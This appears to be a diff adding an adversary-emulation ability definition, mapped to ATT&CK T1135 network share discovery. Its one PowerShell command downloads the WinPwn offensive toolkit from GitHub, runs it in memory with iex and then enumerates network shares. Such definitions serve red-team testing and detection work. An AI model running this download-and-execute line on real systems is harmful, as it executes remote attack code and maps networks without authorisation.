@@ -1,0 +1,18 @@
+---
+- id: 18516797e561c1757c52e34a68d5da24
+  name: WinPwn - shareenumeration
+  description: Network share enumeration using the shareenumeration function of WinPwn
+  tactic: discovery
+  technique:
+    attack_id: T1135
+    name: Network Share Discovery
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          shareenumeration -noninteractive -consoleoutput
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
